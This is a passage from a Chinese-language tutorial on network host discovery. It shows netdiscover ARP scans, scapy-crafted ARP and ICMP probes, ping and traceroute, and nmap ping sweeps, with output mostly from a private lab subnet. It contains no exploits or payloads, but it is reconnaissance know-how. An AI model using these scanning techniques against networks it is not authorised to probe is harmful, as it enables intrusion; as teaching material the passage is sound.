<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># netdiscover -h</span></span><br><span class="line">Netdiscover 0.8 [Active/passive ARP reconnaissance tool]</span><br><span class="line">Written by: Jaime Penalba &lt;jpenalbae@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Usage: netdiscover [-i device] [-r range | -l file | -p] [-m file] [-F filter] [-s time] [-c count] [-n node] [-dfPLNS]</span><br><span class="line">  -i device: your network device</span><br><span class="line">  -r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8</span><br><span class="line">  -l file: scan the list of ranges contained into the given file</span><br><span class="line">  -p passive mode: <span class="keyword">do</span> not send anything, only sniff</span><br><span class="line">  -m file: scan a list of known MACs and host names</span><br><span class="line">  -F filter: customize pcap filter expression (default: <span class="string">&quot;arp&quot;</span>)</span><br><span class="line">  -s time: time to <span class="built_in">sleep</span> between each ARP request (milliseconds)</span><br><span class="line">  -c count: number of <span class="built_in">times</span> to send each ARP request (<span class="keyword">for</span> nets with packet loss)</span><br><span class="line">  -n node: last <span class="built_in">source</span> IP octet used <span class="keyword">for</span> scanning (from 2 to 253)</span><br><span class="line">  -d ignore home config files <span class="keyword">for</span> autoscan and fast mode</span><br><span class="line">  -f <span class="built_in">enable</span> fastmode scan, saves a lot of time, recommended <span class="keyword">for</span> auto</span><br><span class="line">  -P <span class="built_in">print</span> results <span class="keyword">in</span> a format suitable <span class="keyword">for</span> parsing by another program and stop after active scan</span><br><span class="line">  -L similar to -P but <span class="built_in">continue</span> listening after the active scan is completed</span><br><span class="line">  -N Do not <span class="built_in">print</span> header. Only valid when -P or -L is enabled.</span><br><span class="line">  -S <span class="built_in">enable</span> <span class="built_in">sleep</span> time suppression between each request (hardcore mode)</span><br><span class="line"></span><br><span class="line">If -r, -l or -p are not enabled, netdiscover will scan <span class="keyword">for</span> common LAN addresses.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>主动探测</strong></p>
<p><strong>例 1 探测10.10.10.0网段：</strong></p>
<p><strong>命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># netdiscover -i eth0 -r  10.10.10.0/24  </span></span><br></pre></td></tr></table></figure>
<p><strong>探测结果</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts                       </span><br><span class="line">                                                                                     </span><br><span class="line"> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                     </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 10.10.10.1      00:50:56:c0:00:08      1      60  VMware, Inc.                      </span><br><span class="line"> 10.10.10.2      00:50:56:f0:f4:b1      1      60  VMware, Inc.                      </span><br><span class="line"> 10.10.10.254    00:50:56:f4:cc:5e      1      60  VMware, Inc. </span><br></pre></td></tr></table></figure>
<p><strong>例 2 探测指定IP：</strong></p>
<p><strong>list.txt</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211119224610039-39409109.png" /></strong></p>
<p><strong>命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># netdiscover -l /home/kali/Desktop/list.txt   </span></span><br></pre></td></tr></table></figure>
<p><strong>结果同例 1</strong></p>
<p><strong>被动探测</strong></p>
<p><strong>例 3：</strong></p>
<p><strong>启动监听</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># netdiscover -p   </span></span><br></pre></td></tr></table></figure>
<p><strong>监测结果</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: (passive)   |   Screen View: Unique Hosts                       </span><br><span class="line">                                                                                    </span><br><span class="line">9 Captured ARP Req/Rep packets, from 1 hosts.   Total size: 540                     </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">10.10.10.1      00:50:56:c0:00:08      9     540  VMware, Inc.   </span><br></pre></td></tr></table></figure>
<h3 id="scapy">4、scapy</h3>
<ul>
<li>作为python库进行调用</li>
<li>也可作为单独的工具使用</li>
<li>抓包，分析，创建，修改，注入网络流量</li>
</ul>
<p>使用举例</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali) -[/home/kali]</span><br><span class="line">└─<span class="comment"># scapy</span></span><br><span class="line">INFO: Can<span class="string">&#x27;t import PyX. Won&#x27;</span>t be able to use psdump() or pdfdump().</span><br><span class="line">                                      </span><br><span class="line">                     aSPY//YASa       </span><br><span class="line">             apyyyyCY//////////YCa       |</span><br><span class="line">            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy</span><br><span class="line"> ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.4</span><br><span class="line"> AYAsAYYYYYYYY///Ps              cY//S   |</span><br><span class="line">         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy</span><br><span class="line">         SPPPP///a          pP///AC//Y   |</span><br><span class="line">              A//A            cyP////C   | Have fun!</span><br><span class="line">              p///Ac            sC///a   |</span><br><span class="line">              P////YCpc           A//A   | Wanna support scapy? Rate it on</span><br><span class="line">       scccccp///pSP///p          p//Y   | sectools!</span><br><span class="line">      sY/////////y  caa           S//P   | http://sectools.org/tool/scapy/</span><br><span class="line">       cayCyayP//Ya              pY/Ya   |             -- Satoshi Nakamoto</span><br><span class="line">        sY/PsY////YCc          aC//Yp    |</span><br><span class="line">         sc  sccaCY//PCypaapyCP//YSs  </span><br><span class="line">                  spCPY//////YPSps    </span><br><span class="line">                       ccaacs         </span><br><span class="line">                                       using IPython 7.22.0</span><br><span class="line">&gt; &gt;&gt;ARP().display()　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　<span class="comment">###注意，函数名称ARP必须大写，display表示查看调用函数的内容</span></span><br><span class="line"><span class="comment">###[ ARP ]### </span></span><br><span class="line">  hwtype= 0x1</span><br><span class="line">  ptype= IPv4</span><br><span class="line">  hwlen= None</span><br><span class="line">  plen= None</span><br><span class="line">  op= who-has</span><br><span class="line">  hwsrc= 00:0c:29:e1:66:77</span><br><span class="line">  psrc= 10.10.10.135</span><br><span class="line">  hwdst= 00:00:00:00:00:00</span><br><span class="line">  pdst= 0.0.0.0</span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt; ARP.pdst=<span class="string">&quot;10.10.10.2&quot;</span>　　　　　　　　　　　　　　　　　　　　　　　　　　　　　<span class="comment">#赋值  </span></span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt;sr1(ARP())　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　<span class="comment">#发包探测10.10.10.2</span></span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">*</span><br><span class="line">Received 1 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&lt;ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=00:50:56:f0:f4:b1 psrc=10.10.10.2 hwdst=00:0c:29:e1:66:77 pdst=10.10.10.135 |&lt;Padding  load=<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> |&gt;&gt;   </span><br><span class="line">&gt;&gt;&gt; sr1(ARP(pdst= <span class="string">&quot;10.10.10.9&quot;</span>),<span class="built_in">timeout</span>=1,verbose=1) <span class="comment"># timeout 超时 1s，verbose=1 表示若有报错则显示出来，=0，不显示</span></span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line"></span><br><span class="line">Received 0 packets, got 0 answers, remaining 1 packets</span><br><span class="line">&gt; &gt;&gt; sr1(ARP(pdst=<span class="string">&quot;10.10.10.9&quot;</span>),<span class="built_in">timeout</span>=1,verbose=0)</span><br><span class="line">&lt;ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=00:50:56:f0:f4:b1 psrc=10.10.10.2 hwdst=00:0c:29:e1:66:77 pdst=10.10.10.135 |&lt;Padding  load=<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> |&gt;&gt;   </span><br><span class="line">&gt;&gt;&gt; sr1(ARP(pdst=<span class="string">&quot;10.10.10.9&quot;</span>),<span class="built_in">timeout</span>=1,verbose=1)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line"></span><br><span class="line">Received 0 packets, got 0 answers, remaining 1 packets</span><br><span class="line">&gt; &gt;&gt; arp=ARP()　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　<span class="comment">#也可以通过定义变量实现函数的调用，个人理解，该操作相当于类的实例化（对象）</span></span><br><span class="line">&gt;&gt;&gt;arp.display()</span><br><span class="line"><span class="comment">###[ ARP ]### </span></span><br><span class="line">  hwtype= 0x1</span><br><span class="line">  ptype= IPv4</span><br><span class="line">  hwlen= None</span><br><span class="line">  plen= None</span><br><span class="line">  op= who-has</span><br><span class="line">  hwsrc= 00:0c:29:e1:66:77</span><br><span class="line">  psrc= 10.10.10.135</span><br><span class="line">  hwdst= 00:00:00:00:00:00</span><br><span class="line">  pdst= 0.0.0.0</span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt; arp.pdst=<span class="string">&quot;10.10.10.2&quot;</span></span><br><span class="line">&gt;&gt;&gt;arp.display()</span><br><span class="line"><span class="comment">###[ ARP ]### </span></span><br><span class="line">  hwtype= 0x1</span><br><span class="line">  ptype= IPv4</span><br><span class="line">  hwlen= None</span><br><span class="line">  plen= None</span><br><span class="line">  op= who-has</span><br><span class="line">  hwsrc= 00:0c:29:e1:66:77</span><br><span class="line">  psrc= 10.10.10.135</span><br><span class="line">  hwdst= 00:00:00:00:00:00</span><br><span class="line">  pdst= 10.10.10.2</span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt; answer=sr1(arp)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">*</span><br><span class="line">Received 1 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&gt; &gt;&gt;answer.display()</span><br><span class="line"><span class="comment">###[ ARP ]### </span></span><br><span class="line">  hwtype= 0x1</span><br><span class="line">  ptype= IPv4</span><br><span class="line">  hwlen= 6</span><br><span class="line">  plen= 4</span><br><span class="line">  op= is-at</span><br><span class="line">  hwsrc= 00:50:56:f0:f4:b1</span><br><span class="line">  psrc= 10.10.10.2</span><br><span class="line">  hwdst= 00:0c:29:e1:66:77</span><br><span class="line">  pdst= 10.10.10.135</span><br><span class="line"><span class="comment">###[ Padding ]### </span></span><br><span class="line">     load= <span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span>         <span class="comment">#有效数据包大小小于链路上可转发的数据包大小，故填充了0                                                       </span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
<p><strong>备注：</strong> 也可用python脚本实现指定IP列表的探测</p>
<h2 id="三层ipicmp协议发现">4. 三层（IP,ICMP协议）发现</h2>
<p><strong>优点：</strong></p>
<ul>
<li>可路由</li>
<li>速度快</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>经常被边界防火墙过滤</li>
<li>速度没而层快</li>
</ul>
<h3 id="ping命令">1、ping命令</h3>
<p><strong>命令参数（help）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ping -h        </span><br><span class="line"></span><br><span class="line">Usage</span><br><span class="line">  ping [options] &lt;destination&gt;</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  &lt;destination&gt;      dns name or ip address</span><br><span class="line">  -a                 use audible ping</span><br><span class="line">  -A                 use adaptive ping</span><br><span class="line">  -B                 sticky <span class="built_in">source</span> address</span><br><span class="line">  -c &lt;count&gt;         stop after &lt;count&gt; replies</span><br><span class="line">  -D                 <span class="built_in">print</span> timestamps</span><br><span class="line">  -d                 use SO_DEBUG socket option</span><br><span class="line">  -f                 flood ping</span><br><span class="line">  -h                 <span class="built_in">print</span> <span class="built_in">help</span> and <span class="built_in">exit</span></span><br><span class="line">  -I &lt;interface&gt;     either interface name or address</span><br><span class="line">  -i &lt;interval&gt;      seconds between sending each packet</span><br><span class="line">  -L                 suppress loopback of multicast packets</span><br><span class="line">  -l &lt;preload&gt;       send &lt;preload&gt; number of packages <span class="keyword">while</span> waiting replies</span><br><span class="line">  -m &lt;mark&gt;          tag the packets going out</span><br><span class="line">  -M &lt;pmtud opt&gt;     define mtu discovery, can be one of &lt;<span class="keyword">do</span>|dont|want&gt;</span><br><span class="line">  -n                 no dns name resolution</span><br><span class="line">  -O                 report outstanding replies</span><br><span class="line">  -p &lt;pattern&gt;       contents of padding byte</span><br><span class="line">  -q                 quiet output</span><br><span class="line">  -Q &lt;tclass&gt;        use quality of service &lt;tclass&gt; bits</span><br><span class="line">  -s &lt;size&gt;          use &lt;size&gt; as number of data bytes to be sent</span><br><span class="line">  -S &lt;size&gt;          use &lt;size&gt; as SO_SNDBUF socket option value</span><br><span class="line">  -t &lt;ttl&gt;           define time to live</span><br><span class="line">  -U                 <span class="built_in">print</span> user-to-user latency</span><br><span class="line">  -v                 verbose output</span><br><span class="line">  -V                 <span class="built_in">print</span> version and <span class="built_in">exit</span></span><br><span class="line">  -w &lt;deadline&gt;      reply <span class="built_in">wait</span> &lt;deadline&gt; <span class="keyword">in</span> seconds</span><br><span class="line">  -W &lt;<span class="built_in">timeout</span>&gt;       time to <span class="built_in">wait</span> <span class="keyword">for</span> response</span><br><span class="line"></span><br><span class="line">IPv4 options:</span><br><span class="line">  -4                 use IPv4</span><br><span class="line">  -b                 allow pinging broadcast</span><br><span class="line">  -R                 record route</span><br><span class="line">  -T &lt;timestamp&gt;     define timestamp, can be one of &lt;tsonly|tsandaddr|tsprespec&gt;</span><br><span class="line"></span><br><span class="line">IPv6 options:</span><br><span class="line">  -6                 use IPv6</span><br><span class="line">  -F &lt;flowlabel&gt;     define flow label, default is random</span><br><span class="line">  -N &lt;nodeinfo opt&gt;  use icmp6 node info query, try &lt;<span class="built_in">help</span>&gt; as argument</span><br><span class="line"></span><br><span class="line">For more details see ping(8).</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># ping 10.10.10.2 -c 5             </span></span><br><span class="line">PING 10.10.10.2 (10.10.10.2) 56(84) bytes of data.</span><br><span class="line">64 bytes from 10.10.10.2: icmp_seq=1 ttl=128 time=0.667 ms</span><br><span class="line">64 bytes from 10.10.10.2: icmp_seq=2 ttl=128 time=0.347 ms</span><br><span class="line">64 bytes from 10.10.10.2: icmp_seq=3 ttl=128 time=0.415 ms</span><br><span class="line">64 bytes from 10.10.10.2: icmp_seq=4 ttl=128 time=0.413 ms</span><br><span class="line">64 bytes from 10.10.10.2: icmp_seq=5 ttl=128 time=0.439 ms</span><br><span class="line"></span><br><span class="line">--- 10.10.10.2 ping statistics ---</span><br><span class="line">5 packets transmitted, 5 received, 0% packet loss, time 4096ms</span><br><span class="line">rtt min/avg/max/mdev = 0.347/0.456/0.667/0.109 ms</span><br></pre></td></tr></table></figure>
<p><strong>路由追踪（两种方法）：</strong></p>
<ul>
<li><strong>ping -R ip</strong></li>
<li><strong>traceroute ip</strong></li>
</ul>
<p><strong>区别如下图</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211120212233020-1751770334.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># traceroute -i wlan0  8.8.8.8     </span></span><br><span class="line">traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets</span><br><span class="line"> 1  * * *</span><br><span class="line"> 2  * * *</span><br><span class="line"> 3  * * 172.19.1.45 (172.19.1.45)  162.168 ms</span><br><span class="line"> 4  * * *</span><br><span class="line"> 5  221.228.20.145 (221.228.20.145)  167.425 ms  167.416 ms  167.351 ms</span><br><span class="line"> 6  221.228.58.85 (221.228.58.85)  166.842 ms 221.228.58.81 (221.228.58.81)  132.664 ms 221.228.58.65 (221.228.58.65)  127.768 ms</span><br><span class="line"> 7  202.97.54.189 (202.97.54.189)  130.602 ms 202.97.29.125 (202.97.29.125)  130.448 ms 202.97.29.109 (202.97.29.109)  130.585 ms</span><br><span class="line"> 8  * * 202.97.83.133 (202.97.83.133)  132.683 ms</span><br><span class="line"> 9  202.97.12.206 (202.97.12.206)  127.106 ms 202.97.85.22 (202.97.85.22)  127.128 ms *</span><br><span class="line">10  202.97.6.6 (202.97.6.6)  253.357 ms  248.049 ms *</span><br><span class="line">11  202.97.122.70 (202.97.122.70)  168.936 ms  171.358 ms  167.659 ms</span><br><span class="line">12  108.170.241.65 (108.170.241.65)  170.794 ms 108.170.241.33 (108.170.241.33)  194.441 ms 108.170.241.97 (108.170.241.97)  164.078 ms</span><br><span class="line">13  216.239.42.89 (216.239.42.89)  156.988 ms 142.251.60.59 (142.251.60.59)  162.383 ms *</span><br><span class="line">14  dns.google (8.8.8.8)  165.997 ms  171.891 ms  177.068 ms</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># traceroute -i wlan0  116.62.230.66</span></span><br><span class="line">traceroute to 116.62.230.66 (116.62.230.66), 30 hops max, 60 byte packets</span><br><span class="line"> 1  192.168.43.1 (192.168.43.1)  12.700 ms  29.716 ms  55.384 ms</span><br><span class="line"> 2  * * *</span><br><span class="line"> 3  172.19.1.45 (172.19.1.45)  76.937 ms  78.600 ms  88.430 ms</span><br><span class="line"> 4  * * *</span><br><span class="line"> 5  * * *</span><br><span class="line"> 6  221.228.58.69 (221.228.58.69)  74.605 ms 221.228.58.85 (221.228.58.85)  27.696 ms 221.228.58.89 (221.228.58.89)  30.702 ms</span><br><span class="line"> 7  202.97.33.182 (202.97.33.182)  66.783 ms 202.97.33.130 (202.97.33.130)  40.810 ms 202.97.33.162 (202.97.33.162)  44.124 ms</span><br><span class="line"> 8  220.191.199.42 (220.191.199.42)  59.205 ms * 220.191.200.154 (220.191.200.154)  43.821 ms</span><br><span class="line"> 9  115.236.101.213 (115.236.101.213)  53.452 ms 115.236.101.221 (115.236.101.221)  53.043 ms 115.236.101.217 (115.236.101.217)  72.418 ms</span><br><span class="line">10  42.120.247.109 (42.120.247.109)  81.178 ms * *</span><br><span class="line">11  * 117.49.54.33 (117.49.54.33)  52.973 ms *</span><br><span class="line">12  * * *</span><br><span class="line">13  * * *</span><br><span class="line">14  * * *</span><br><span class="line">15  * * *</span><br><span class="line">16  * * *</span><br><span class="line">17  * * *</span><br><span class="line">18  * * *</span><br><span class="line">19  * * *</span><br><span class="line">20  * * *</span><br><span class="line">21  * * *</span><br><span class="line">22  * * *</span><br><span class="line">23  * * *</span><br><span class="line">24  * * *</span><br><span class="line">25  * * *</span><br><span class="line">26  * * *</span><br><span class="line">27  * * *</span><br><span class="line">28  * * *</span><br><span class="line">29  * * *</span><br><span class="line">30  * * * ┌──(root💀kali) -[/home/kali]</span><br><span class="line">└─<span class="comment"># ping 116.62.230.66 -R -I wlan0 </span></span><br><span class="line">PING 116.62.230.66 (116.62.230.66) from 192.168.43.132 wlan0: 56(124) bytes of data.</span><br><span class="line">64 bytes from 116.62.230.66: icmp_seq=1 ttl=88 time=276 ms</span><br><span class="line">NOP</span><br><span class="line">RR:     192.168.43.132</span><br><span class="line">        10.197.46.1</span><br><span class="line">        172.19.1.13</span><br><span class="line">        221.228.20.138</span><br><span class="line">        221.228.58.66</span><br><span class="line">        202.97.100.157</span><br><span class="line">        220.191.200.203</span><br><span class="line">        115.236.101.214</span><br><span class="line">        42.120.247.58</span><br><span class="line"></span><br><span class="line">64 bytes from 116.62.230.66: icmp_seq=2 ttl=88 time=161 ms</span><br><span class="line">NOP     (same route)</span><br><span class="line">64 bytes from 116.62.230.66: icmp_seq=3 ttl=88 time=239 ms</span><br><span class="line">NOP     (same route)</span><br><span class="line">………………</span><br></pre></td></tr></table></figure>
<h3 id="scapy-1">2、scapy</h3>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># scapy</span></span><br><span class="line">INFO: Can<span class="string">&#x27;t import PyX. Won&#x27;</span>t be able to use psdump() or pdfdump().</span><br><span class="line">                                      </span><br><span class="line">                     aSPY//YASa       </span><br><span class="line">             apyyyyCY//////////YCa       |</span><br><span class="line">            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy</span><br><span class="line"> ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.4</span><br><span class="line"> AYAsAYYYYYYYY///Ps              cY//S   |</span><br><span class="line">         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy</span><br><span class="line">         SPPPP///a          pP///AC//Y   |</span><br><span class="line">              A//A            cyP////C   | Have fun!</span><br><span class="line">              p///Ac            sC///a   |</span><br><span class="line">              P////YCpc           A//A   | Craft packets before they craft</span><br><span class="line">       scccccp///pSP///p          p//Y   | you.</span><br><span class="line">      sY/////////y  caa           S//P   |                      -- Socrate</span><br><span class="line">       cayCyayP//Ya              pY/Ya   |</span><br><span class="line">        sY/PsY////YCc          aC//Yp </span><br><span class="line">         sc  sccaCY//PCypaapyCP//YSs  </span><br><span class="line">                  spCPY//////YPSps    </span><br><span class="line">                       ccaacs         </span><br><span class="line">                                       using IPython 7.22.0</span><br><span class="line">&gt; &gt;&gt; i=IP()</span><br><span class="line">&gt;&gt;&gt; p=ICMP()</span><br><span class="line">&gt;&gt;&gt; ping=(i/p)　　　　　　　　<span class="comment">#组合成ping的数据包</span></span><br><span class="line">&gt;&gt;&gt; ping.display()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= icmp</span><br><span class="line">  chksum= None</span><br><span class="line">  src= 127.0.0.1</span><br><span class="line">  dst= 127.0.0.1</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ ICMP ]### </span></span><br><span class="line">     <span class="built_in">type</span>= echo-request　　　　　　<span class="comment">#默认是request包，若不是可通过&quot; ping[ICMP].type=8&quot; 设定为request</span></span><br><span class="line">     code= 0</span><br><span class="line">     chksum= None</span><br><span class="line">     <span class="built_in">id</span>= 0x0</span><br><span class="line">     <span class="built_in">seq</span>= 0x0</span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt; ping[IP].dst=<span class="string">&quot;10.10.10.2&quot;</span>　　　　　　<span class="comment">#目标IP，注意src会自动识别添加</span></span><br><span class="line">&gt;&gt;&gt; ping.display()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= icmp</span><br><span class="line">  chksum= None</span><br><span class="line">  src= 10.10.10.135</span><br><span class="line">  dst= 10.10.10.2</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ ICMP ]### </span></span><br><span class="line">     <span class="built_in">type</span>= echo-request</span><br><span class="line">     code= 0</span><br><span class="line">     chksum= None</span><br><span class="line">     <span class="built_in">id</span>= 0x0</span><br><span class="line">     <span class="built_in">seq</span>= 0x0</span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt; a=sr1(ping)　　　　　　<span class="comment">#发包</span></span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">.*</span><br><span class="line">Received 2 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&gt; &gt;&gt;a.display()　　　　　　<span class="comment">#探测结果</span></span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= 5</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= 28</span><br><span class="line">  <span class="built_in">id</span>= 65492</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 128</span><br><span class="line">  proto= icmp</span><br><span class="line">  chksum= 0x1270</span><br><span class="line">  src= 10.10.10.2</span><br><span class="line">  dst= 10.10.10.135</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ ICMP ]### </span></span><br><span class="line">     <span class="built_in">type</span>= echo-reply</span><br><span class="line">     code= 0</span><br><span class="line">     chksum= 0xffff</span><br><span class="line">     <span class="built_in">id</span>= 0x0</span><br><span class="line">     <span class="built_in">seq</span>= 0x0</span><br><span class="line"><span class="comment">###[ Padding ]### </span></span><br><span class="line">        load= <span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt; ping[IP].dst=<span class="string">&quot;10.10.10.88&quot;</span>      <span class="comment">#探测不存在的IP  </span></span><br><span class="line">&gt; &gt;&gt; a1=sr1(ping)</span><br><span class="line">Begin emission:</span><br><span class="line">WARNING: Mac address to reach destination not found. Using broadcast.</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">.......^C</span><br><span class="line">Received 7 packets, got 0 answers, remaining 1 packets</span><br><span class="line">&gt; &gt;&gt; a1=sr1(ping,<span class="built_in">timeout</span>=1,verbose=1)　　　　<span class="comment">#可通添加timeout避免一直探测同一IP</span></span><br><span class="line">Begin emission:</span><br><span class="line">WARNING: Mac address to reach destination not found. Using broadcast.</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line"></span><br><span class="line">Received 1 packets, got 0 answers, remaining 1 packets</span><br></pre></td></tr></table></figure>
<p><strong>简写：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; &gt;&gt; A=sr1(IP(dst=<span class="string">&quot;10.10.10.2&quot;</span>)/ICMP(),<span class="built_in">timeout</span>=1)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">.*</span><br><span class="line">Received 2 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&gt;&gt;&gt; A.display()</span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= 5</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= 28</span><br><span class="line">  <span class="built_in">id</span>= 65496</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 128</span><br><span class="line">  proto= icmp</span><br><span class="line">  chksum= 0x126c</span><br><span class="line">  src= 10.10.10.2</span><br><span class="line">  dst= 10.10.10.135</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ ICMP ]### </span></span><br><span class="line">     <span class="built_in">type</span>= echo-reply</span><br><span class="line">     code= 0</span><br><span class="line">     chksum= 0xffff</span><br><span class="line">     <span class="built_in">id</span>= 0x0</span><br><span class="line">     <span class="built_in">seq</span>= 0x0</span><br><span class="line"><span class="comment">###[ Padding ]### </span></span><br><span class="line">        load= <span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="nmap-1">3、nmap</h3>
<p><strong>注意，nmap探测和SRC同网段和不同网段发的数据包时不一样的！</strong></p>
<p><strong>同网段发ARP数据包：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># nmap 10.10.10.1-100 -sn</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-20 09:00 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.2</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">MAC Address: 00:50:56:F0:F4:B1 (VMware)</span><br><span class="line">Nmap <span class="keyword">done</span>: 100 IP addresses (1 host up) scanned <span class="keyword">in</span> 13.02 seconds</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211120220208797-256253212.png" /></p>
<p><strong>不同网段发ICMP+TCP数据包：</strong></p>
